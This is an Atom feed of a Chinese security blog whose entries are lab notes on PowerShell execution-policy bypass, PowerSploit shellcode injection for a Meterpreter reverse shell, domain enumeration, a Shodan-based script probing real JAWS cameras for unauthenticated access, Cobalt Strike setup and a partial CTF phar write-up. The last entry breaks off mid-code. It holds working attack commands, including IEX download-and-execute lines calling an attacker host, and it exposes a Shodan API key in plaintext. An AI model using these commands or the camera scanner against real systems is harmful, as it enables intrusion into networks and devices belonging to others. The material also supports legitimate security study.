<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Goudan&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://goudanjun.vip/"/>
  <updated>2021-03-10T03:34:38.185Z</updated>
  <id>http://goudanjun.vip/</id>
  
  <author>
    <name>狗蛋菌</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PowerShell学习全记录</title>
    <link href="http://goudanjun.vip/2021/03/10/PowerShell%E5%AD%A6%E4%B9%A0%E5%85%A8%E8%AE%B0%E5%BD%95.html/"/>
    <id>http://goudanjun.vip/2021/03/10/PowerShell学习全记录.html/</id>
    <published>2021-03-10T01:56:23.000Z</published>
    <updated>2021-03-10T03:34:38.185Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h1><h2 id="powershell执行策略"><a href="#powershell执行策略" class="headerlink" title="powershell执行策略"></a>powershell执行策略</h2><table><thead><tr><th align="center">策略</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">Restricted</td><td align="center">脚本不能运行</td></tr><tr><td align="center">AllSigned</td><td align="center">仅当脚本由受信任的发布者签名时才能运行</td></tr><tr><td align="center">RemoteSigned</td><td align="center">本地创建的脚本可以运行，但从网上下的不能运行</td></tr><tr><td align="center">Unrestricted</td><td align="center">允许所有的script运行</td></tr></tbody></table><p>查看策略</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ExecutionPolicy</span></span><br></pre></td></tr></table></figure><p>设置策略</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> &lt;策略&gt;</span><br></pre></td></tr></table></figure><h2 id="绕过powershell的执行策略"><a href="#绕过powershell的执行策略" class="headerlink" title="绕过powershell的执行策略"></a>绕过powershell的执行策略</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#绕过本地权限执行</span></span><br><span class="line">powershell.exe -Executionpolicy Bypass -File xxx.ps1</span><br><span class="line"><span class="comment">#本地隐藏绕过权限执行脚本</span></span><br><span class="line">powershell.exe -Executionpolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -File xxx.ps1</span><br><span class="line"><span class="comment">#用IEX下载远程PS1脚本绕过权限执行</span></span><br><span class="line">powershell.exe -executionpolicy bypass -windowstyle hidden -nologo -noprofile IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">"xxx.ps1"</span>);[parameters]</span><br></pre></td></tr></table></figure><h1 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h1><p><img src="https://i.loli.net/2021/03/10/HtRshvr8z32Mqmp.png" alt="image-20210310102318531"></p><h2 id="powersploit实战（进程注入反弹shell）"><a href="#powersploit实战（进程注入反弹shell）" class="headerlink" title="powersploit实战（进程注入反弹shell）"></a>powersploit实战（进程注入反弹shell）</h2><ol><li><p>MSF中设置监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_https</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/10/PGA1RtC6njxUdp7.png" alt="image-20210310113150127"></p></li><li><p>使用 msfvenom 生成一个 powershell 脚本木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.239.134 LPORT=4444 -f powershell -o /var/www/html/test</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/10/iNmq8tkLpY3fJb9.png" alt="image-20210310113211491"></p></li><li><p>目标机下载 invoke-shellcode 和 木马</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">"http://192.168.239.134/powersploit/CodeExecution/Invoke-Shellcode.ps1"</span>)</span><br><span class="line">IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">"http://192.168.239.134/test"</span>)</span><br></pre></td></tr></table></figure></li></ol><ol start="4"><li>创建一个新的进程进行注入</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Start-Process</span> c:\windows\system32\notepad.exe -WindowStyle Hidden</span><br><span class="line">Invoke-Shellcode -ProcessID <span class="number">2816</span> -Shellcode (<span class="variable">$buf</span>) -Force</span><br></pre></td></tr></table></figure><h1 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h1><h1 id="PowerCat"><a href="#PowerCat" class="headerlink" title="PowerCat"></a>PowerCat</h1>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PowerShell&quot;&gt;&lt;a href=&quot;#PowerShell&quot; class=&quot;headerlink&quot; title=&quot;PowerShell&quot;&gt;&lt;/a&gt;PowerShell&lt;/h1&gt;&lt;h2 id=&quot;powershell执行策略&quot;&gt;&lt;a href=&quot;#powersh
      
    
    </summary>
    
    
      <category term="内网" scheme="http://goudanjun.vip/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>内网学习记录</title>
    <link href="http://goudanjun.vip/2021/03/08/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.html/"/>
    <id>http://goudanjun.vip/2021/03/08/内网学习记录.html/</id>
    <published>2021-03-08T11:36:50.000Z</published>
    <updated>2021-03-08T13:23:11.767Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">net user /domain<span class="comment">#查看域用户</span></span><br><span class="line">net view /domain<span class="comment">#查看有几个域</span></span><br><span class="line">net view /domain:XXX<span class="comment">#查看域内主机</span></span><br><span class="line">net group /domain<span class="comment">#查看域里面的组</span></span><br><span class="line">net group <span class="string">"domain computers"</span> /domain<span class="comment">#查看域内所有主机名</span></span><br><span class="line">net group <span class="string">"domain admins"</span> /domain<span class="comment">#查看域管理员</span></span><br><span class="line">net group <span class="string">"domain controllers"</span> /domain<span class="comment">#查看域控制器</span></span><br><span class="line">net group <span class="string">"enterprise admins"</span> /domain<span class="comment">#查看企业管理组</span></span><br><span class="line">nettime /domain<span class="comment">#查看时间服务器</span></span><br></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>提权之前：第一次getshell的时候要进行进程的迁移，进而获取稳定的shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#手动迁移</span></span><br><span class="line">migrate &lt;PID&gt;</span><br><span class="line"><span class="comment">#自动迁移</span></span><br><span class="line">run post/windows/manage/migrate</span><br></pre></td></tr></table></figure><h2 id="windows各漏洞对应补丁："><a href="#windows各漏洞对应补丁：" class="headerlink" title="windows各漏洞对应补丁："></a>windows各漏洞对应补丁：</h2><p><img src="https://i.loli.net/2021/03/08/bWeiuH2Cl9Xnmcw.jpg" alt="IMG_0726(20210308-110246)"><img src="https://i.loli.net/2021/03/08/2cKIuaoPyVNTCZl.jpg" alt="IMG_0727(20210308-110307)"></p><h2 id="ms16-032实验："><a href="#ms16-032实验：" class="headerlink" title="ms16_032实验："></a>ms16_032实验：</h2><p>getshell后是用户权限：</p><p><img src="https://i.loli.net/2021/03/08/jgHM8fcr5Eo7KlW.png" alt="image-20210308204554539"></p><p>将这个session放到后台运行，搜索ms16032，设置session为刚才的session</p><p><img src="https://i.loli.net/2021/03/08/gPA3LD7CSu2Bf1m.png" alt="image-20210308204708951"></p><p>提权后：</p><p><img src="https://i.loli.net/2021/03/08/Rev19GBgq4OVA2E.png" alt="image-20210308204751797"></p><h1 id="内网横向移动（拿域控）"><a href="#内网横向移动（拿域控）" class="headerlink" title="内网横向移动（拿域控）"></a>内网横向移动（拿域控）</h1><ol><li>使用当前权限添加内网路由，进行弱口令扫描</li><li>使用powershell对内网进行扫描（目标机器 &gt; win7）</li><li>架设Socket4a，然后Socket会自动进行内网扫描</li><li>利用当前权限进行内网IPC$渗透</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre
      
    
    </summary>
    
    
      <category term="内网" scheme="http://goudanjun.vip/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>python学习记录</title>
    <link href="http://goudanjun.vip/2021/02/07/python%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.html/"/>
    <id>http://goudanjun.vip/2021/02/07/python学习记录.html/</id>
    <published>2021-02-07T11:46:24.000Z</published>
    <updated>2021-03-05T01:32:46.677Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python的shodan库"><a href="#python的shodan库" class="headerlink" title="python的shodan库"></a>python的shodan库</h1><a id="more"></a><p>库函数：</p><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>shodan.Shodan(key)</td><td>初始化连接API</td></tr><tr><td>Shodan.count(query, facets=None)</td><td>返回查询结果数量</td></tr><tr><td>Shodan.host(ip, history=False)</td><td>返回一个IP的详细信息</td></tr><tr><td>Shodan.ports()</td><td>返回Shodan可查询的端口号</td></tr><tr><td>Shodan.protocols()</td><td>返回Shodan可查询的协议</td></tr><tr><td>Shodan.services()</td><td>返回Shodan可查询的服务</td></tr><tr><td>Shodan.queries(page=1, sort=’timestamp’, order=’desc’)</td><td>查询其他用户分享的查询规则</td></tr><tr><td>Shodan.scan(ips, force=False)</td><td>使用Shodan进行扫描，ips可以为字符或字典类型</td></tr><tr><td>Shodan.search(query, page=1, limit=None, offset=None, facets=None, minify=True)</td><td>查询Shodan数据</td></tr></tbody></table><p>在CMD中可以验证shodan是否能成功连接</p><p><img src="https://i.loli.net/2021/02/07/el5tEcjKdbSh716.png" alt="image-20210207200212322"></p><h2 id="扫描apache的主机"><a href="#扫描apache的主机" class="headerlink" title="扫描apache的主机"></a>扫描apache的主机</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> shodan    <span class="comment">#导入shodan库</span></span><br><span class="line">api=shodan.Shodan(<span class="string">"cB9sXwb7l95ZhSJaNgcaO7NQpkzfhQVM"</span>)  <span class="comment">#指定API_KEY,返回句柄</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    results=api.search(<span class="string">'apache'</span>)    <span class="comment">#搜索apache，返回 JSON格式的数据</span></span><br><span class="line">    print(results)</span><br><span class="line">    print(<span class="string">"Results found:%s"</span>%results[<span class="string">'total'</span>])</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> results[<span class="string">'matches'</span>]:</span><br><span class="line">        print(result[<span class="string">'ip_str'</span>])     <span class="comment">#打印出ip地址</span></span><br><span class="line"><span class="keyword">except</span> shoadn.APIError,e:</span><br><span class="line">    print(<span class="string">"Error:%s"</span>%e)</span><br></pre></td></tr></table></figure><p>返回的数据是JSON格式</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        'total': 8669969,</span><br><span class="line">        'matches': [</span><br><span class="line">                &#123;</span><br><span class="line">                        'data': 'HTTP/1.0 200 OK\r\nDate: Mon, 08 Nov 2010 05:09:59 GMT\r\nSer...',</span><br><span class="line">                        'hostnames': ['pl4t1n.de'],</span><br><span class="line">                        'ip': 3579573318,</span><br><span class="line">                        'ip_str': '89.110.147.239',</span><br><span class="line">                        'os': 'FreeBSD 4.4',</span><br><span class="line">                        'port': 80,</span><br><span class="line">                        'timestamp': '2014-01-15T05:49:56.283713'</span><br><span class="line">                &#125;,</span><br><span class="line">                ...</span><br><span class="line">        ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img src="https://i.loli.net/2021/02/07/3ZYopRmk59SVd1r.png" alt="image-20210207201131030"></p><h2 id="入侵大白鲨摄像头"><a href="#入侵大白鲨摄像头" class="headerlink" title="入侵大白鲨摄像头"></a>入侵大白鲨摄像头</h2><p>大白鲨摄像头的banner中有一个很明显的特征：<strong>JAWS/1.0</strong></p><p>而且该摄像头初始密码为空 从而可以利用该未授权漏洞</p><p>搜索大白鲨摄像头，并存入文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f=open(<span class="string">"target.txt"</span>,<span class="string">"w"</span>)</span><br><span class="line">results=api.search(<span class="string">'JAWS/1.0'</span>)     <span class="comment">#搜索大白鲨摄像头</span></span><br><span class="line">print(<span class="string">"Results found:%s"</span>%results[<span class="string">'total'</span>])</span><br><span class="line"><span class="keyword">for</span> result <span class="keyword">in</span> results[<span class="string">'matches'</span>]:</span><br><span class="line">url=result[<span class="string">'ip_str'</span>]+<span class="string">":"</span>+str(result[<span class="string">'port'</span>])  <span class="comment">#摄像头的ip和端口</span></span><br><span class="line">f.write(url+<span class="string">"\n"</span>)    </span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>因为没有会员只能查询前100条，利用python自动化测试这100条记录中有哪些有未授权的漏洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'target.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> host <span class="keyword">in</span> f.readlines():</span><br><span class="line">        host = host.split(<span class="string">"\n"</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># print host</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">'Host'</span>: host,</span><br><span class="line">            <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'</span>,</span><br><span class="line">            <span class="string">'Referer'</span>:<span class="string">"http://"</span>+ host +<span class="string">"/"</span>,</span><br><span class="line">            <span class="string">'Accept'</span>:<span class="string">"*/*"</span>,</span><br><span class="line">            <span class="string">'Accept-Language'</span>:<span class="string">'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line">            <span class="string">'X-Requested-With'</span>:<span class="string">'XMLHttpRequest'</span>,</span><br><span class="line">            <span class="string">'Connection'</span>:<span class="string">'close'</span></span><br><span class="line">        &#125;</span><br><span class="line">        data = <span class="string">"xml="</span> + b</span><br><span class="line">        url = <span class="string">"http://"</span>+ host +<span class="string">"/cgi-bin/gw.cgi?"</span> + data</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            req = urllib2.Request(url,headers=headers)</span><br><span class="line">            response = urllib2.urlopen(req,timeout=<span class="number">10</span>)</span><br><span class="line">            length = response.headers[<span class="string">'Content-Length'</span>]</span><br><span class="line">            <span class="keyword">if</span> length == str(<span class="string">"175"</span>):</span><br><span class="line">                <span class="keyword">print</span> host</span><br><span class="line">        <span class="keyword">except</span> urllib2.URLError,e:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"请求超时"</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/07/NeOiumITz9WAy1p.png" alt="image-20210207202308043"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;python的shodan库&quot;&gt;&lt;a href=&quot;#python的shodan库&quot; class=&quot;headerlink&quot; title=&quot;python的shodan库&quot;&gt;&lt;/a&gt;python的shodan库&lt;/h1&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://goudanjun.vip/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>linux反弹shell的几种常见手段</title>
    <link href="http://goudanjun.vip/2021/02/06/linux%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81%E6%89%8B%E6%AE%B5.html/"/>
    <id>http://goudanjun.vip/2021/02/06/linux反弹shell的几种常见手段.html/</id>
    <published>2021-02-06T13:04:23.000Z</published>
    <updated>2021-02-06T13:04:23.343Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>配置mysql远程访问</title>
    <link href="http://goudanjun.vip/2021/02/04/%E9%85%8D%E7%BD%AEmysql%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AE.html/"/>
    <id>http://goudanjun.vip/2021/02/04/配置mysql远程访问.html/</id>
    <published>2021-02-04T08:40:48.000Z</published>
    <updated>2021-02-04T09:56:45.242Z</updated>
    
    <content type="html"><![CDATA[<p>新装一台虚拟机mysql的时候，往往会出现win无法连接的情况，报错信息1130，是因为没有权限的问题，解决方案如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line"><span class="comment">#以权限用户root登录</span></span><br><span class="line">mysql&gt;use mysql;</span><br><span class="line"><span class="comment">#选择mysql库</span></span><br><span class="line">mysql&gt;select <span class="string">'host'</span> from user <span class="built_in">where</span> user=<span class="string">'root'</span>;</span><br><span class="line"><span class="comment">#查看mysql库中的user表的host值（即可进行连接访问的主机/IP名称）</span></span><br><span class="line">mysql&gt;update user <span class="built_in">set</span> host = <span class="string">'%'</span> <span class="built_in">where</span> user =<span class="string">'root'</span>;</span><br><span class="line"><span class="comment">#修改host值（以通配符%的内容增加主机/IP地址），当然也可以直接增加IP地址</span></span><br><span class="line">mysql&gt;flush privileges;</span><br><span class="line"><span class="comment">#刷新MySQL的系统权限相关表</span></span><br><span class="line">mysql&gt;select <span class="string">'host'</span> from user <span class="built_in">where</span> user=<span class="string">'root'</span>;</span><br><span class="line"><span class="comment">#再重新查看user表时，有修改</span></span><br></pre></td></tr></table></figure><p>记得Mysql服务需要重新启动（确保修改有效-service mysql restart），否则可能修改的结果无法体现。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;新装一台虚拟机mysql的时候，往往会出现win无法连接的情况，报错信息1130，是因为没有权限的问题，解决方案如下：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span c
      
    
    </summary>
    
    
      <category term="mysql" scheme="http://goudanjun.vip/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>docker中awvs使用记录</title>
    <link href="http://goudanjun.vip/2021/01/31/docker%E4%B8%ADawvs%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95.html/"/>
    <id>http://goudanjun.vip/2021/01/31/docker中awvs使用记录.html/</id>
    <published>2021-01-31T14:11:22.000Z</published>
    <updated>2021-01-31T14:22:01.778Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装awvs"><a href="#安装awvs" class="headerlink" title="安装awvs"></a>安装awvs</h1><a id="more"></a><p>docker中拉取下载镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull secfa/docker-awvs</span><br></pre></td></tr></table></figure><p>将docker的3443端口映射到物理机的 13443端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -d -p 13443:3443 secfa/docker-awvs</span><br></pre></td></tr></table></figure><p>如果有报错重启docker后再重复第②步</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker service docker restart </span><br><span class="line">或 </span><br><span class="line">systemctl restart  docker</span><br></pre></td></tr></table></figure><p> 访问awvs</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://docker所在服务器的ip:13343</span><br><span class="line"></span><br><span class="line"><span class="comment">#如果是谷歌chrome浏览器第一次访问awvs，可能会提示网站不可信，始终无法打开</span></span><br></pre></td></tr></table></figure><p> 默认用户名和密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin@admin.com  </span><br><span class="line">password: Admin123</span><br></pre></td></tr></table></figure><h1 id="启动awvs"><a href="#启动awvs" class="headerlink" title="启动awvs"></a>启动awvs</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -d -p 13443:3443 secfa/docker-awvs</span><br></pre></td></tr></table></figure><h1 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a      //查看容器，找到相应id </span><br><span class="line">docker <span class="built_in">exec</span> -it id  /bin/bash      //进入容器 </span><br><span class="line"><span class="built_in">cd</span> /home/acunetix/.acunetix       </span><br><span class="line">./change_credentials.sh</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;安装awvs&quot;&gt;&lt;a href=&quot;#安装awvs&quot; class=&quot;headerlink&quot; title=&quot;安装awvs&quot;&gt;&lt;/a&gt;安装awvs&lt;/h1&gt;
    
    </summary>
    
    
      <category term="kali" scheme="http://goudanjun.vip/tags/kali/"/>
    
      <category term="awvs" scheme="http://goudanjun.vip/tags/awvs/"/>
    
  </entry>
  
  <entry>
    <title>cs简略安装与使用</title>
    <link href="http://goudanjun.vip/2021/01/23/cs%E7%AE%80%E7%95%A5%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8.html/"/>
    <id>http://goudanjun.vip/2021/01/23/cs简略安装与使用.html/</id>
    <published>2021-01-23T12:50:40.000Z</published>
    <updated>2021-01-31T14:22:52.846Z</updated>
    
    <content type="html"><![CDATA[<h1 id="cs的安装"><a href="#cs的安装" class="headerlink" title="cs的安装"></a>cs的安装</h1><a id="more"></a><p>CS 分为客户端和服务端</p><p>这里我在kali上安装服务端</p><p>解压到kali上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./teamserver 192.168.239.134 123456</span><br></pre></td></tr></table></figure><p>192.168.239.134 为本机的IP；123456是客户端连接的密码。</p><p>设置后台运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nohup ./teamserver 192.168.239.134 123456 &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;cs的安装&quot;&gt;&lt;a href=&quot;#cs的安装&quot; class=&quot;headerlink&quot; title=&quot;cs的安装&quot;&gt;&lt;/a&gt;cs的安装&lt;/h1&gt;
    
    </summary>
    
    
      <category term="后渗透" scheme="http://goudanjun.vip/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>[CISCN2019 华北赛区 Day1 Web1]Dropbox</title>
    <link href="http://goudanjun.vip/2021/01/19/%C2%96-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox.html/"/>
    <id>http://goudanjun.vip/2021/01/19/-CISCN2019-华北赛区-Day1-Web1-Dropbox.html/</id>
    <published>2021-01-19T02:46:12.000Z</published>
    <updated>2021-01-19T10:48:37.141Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h1><p>考点：phar协议</p><a id="more"></a><p>注册登录之后是上传页面，正常上传文件，在下载文件处发现存在任意下载漏洞</p><p><img src="https://i.loli.net/2021/01/19/poDisMyHO9qYxwv.png" alt="image-20210119150237883"></p><p>注意要向前跳两级目录，因为通常情况下文件会放在 /sandbox/hash/ 目录下</p><p>利用这点我们可以下载文件：</p><p><img src="https://i.loli.net/2021/01/19/LWqTaxhRr2eVPoH.png" alt="image-20210119150621161"></p><p>源代码审计：</p><p>download.php中对文件名进行了判断 是否含有flag字段，推测我们要下载 flag文件</p><p><img src="https://i.loli.net/2021/01/19/9jGSNo6pFr7Pyz2.png" alt="image-20210119150846724"></p><p>class.php文件中定义了三个类</p><p>User类</p><p><img src="https://i.loli.net/2021/01/19/RBKj2DLCzcmhZbi.png" alt="image-20210119162158238"></p><p>File类</p><p><img src="https://i.loli.net/2021/01/19/64yvhdmQN3lOt9c.png" alt="image-20210119162218126"></p><p>FileList类</p><p><img src="https://i.loli.net/2021/01/19/wr3ToAJnxhiQYpf.png" alt="image-20210119162237449"></p><p>首先file类中存在 close() 方法会调用 file_get_contents() 函数可以读取flag文件，而 User 类中的析构方法会调用 close() 方法，FileList 类中的 __call 魔术方法可以调用file类中的 close()方法，所以我们可以理解为将user类中的 close() 方法实例化后传入 call魔术方法中的 $func 参数</p><p>得到flag文件后 利用 FileList 类中的析构函数输出</p><p>构造php文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $file = <span class="keyword">new</span> File();</span><br><span class="line">        $file-&gt;filename = <span class="string">'/flag.txt'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> User();</span><br><span 